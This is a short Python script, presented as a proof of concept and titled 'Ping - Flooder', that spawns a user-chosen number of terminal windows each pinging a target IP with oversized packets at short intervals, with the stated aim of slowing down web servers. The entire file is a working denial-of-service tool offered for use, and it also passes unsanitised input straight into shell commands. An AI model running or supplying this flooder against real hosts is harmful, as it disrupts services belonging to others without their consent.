'''
This is a POC code, made by Buck3ts41 to 
test if ping tool can be used to 
slow down webservers.
Hope you enjoy :)

'''

import os
import time
import sys
import platform
import subprocess

try:
	from art import *
	from colorama import Fore
except ImportError:
	print(Fore.RED + '[-] Failed to import an external module.')
	if platform.system() == 'Linux':
		print(Fore.YELLOW + '  [*] Trying to install missing dependencies...')
		os.system("pip3 install -r requirements.txt")
		print(Fore.YELLOW + " [!] Done, restart the script")
		time.sleep(1.5)
	elif platform.system() == 'Windows':
		print(Fore.YELLOW + '   [*] Trying to install missing dependencies...')
		os.system("python -m pip install -r requirements.txt")
		print(Fore.YELLOW + " [!] Done, restart the script")
		time.sleep(1.5)
	sys.exit(1)

def vrb():
	global pwr
	global target
	pwr = int(input("Thread: "))
	target = input("Target ip: ") 

def clear():
	if platform.system() == 'Linux':
		os.system("clear")
	if platform.system() == 'Windows':
		os.system("cls")

def banner():
	clear()
	tprint("Ping - Flooder")
	print("Script by Buck3ts41", '\n')
	print("V 2.0")
	if platform.system()== 'Linux':
		print(Fore.BLUE + " [+] Ping Flooder running on linux", '\n')
	if platform.system()== 'Windows':
		print(Fore.BLUE + " [+] Ping Flooder running on Windows", '\n')
		#print("Windows is now full supported", '\n')
	print(Fore.GREEN + " [!] Thread --> ", pwr)
	print(Fore.GREEN + " [!] Target --> ", target)
	time.sleep(2)

def start():

	if platform.system()== 'Linux':
		for k in range(pwr):
			host = subprocess.Popen('lxterminal -e ping ' + str(target) + ' -i 0.2 -s 1999', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)

	if platform.system()== 'Windows':
		for k in range(pwr):
			subprocess.Popen('start cmd /k ping -t -l 1999 ' + str(target), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)

	clear()
	print(Fore.CYAN + " [!] Started")
	time.sleep(5)

vrb()
if pwr>20:
	warning = input(Fore.RED + " [-] High power can effect pc performance, continue?: ")
	if warning=='y':
		banner()
		start()
	if warning=='n':
		sys.exit(1)
if pwr<20 or pwr==20:
	banner()
	start()